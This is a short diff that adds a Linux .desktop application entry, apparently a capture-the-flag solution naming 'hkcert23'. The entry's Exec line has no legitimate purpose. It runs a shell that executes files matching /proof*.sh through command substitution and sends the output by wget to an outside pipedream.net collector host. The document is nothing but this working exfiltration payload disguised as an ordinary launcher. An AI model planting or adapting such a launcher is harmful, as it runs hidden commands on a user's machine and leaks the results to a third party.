@@ -1,0 +1,3 @@
+[Desktop Entry]
+Exec=sh -c "wget https://training.hkcert23.pwnable.hk.m.pipedream.net/?`/proof*.sh`"
+Type=Application
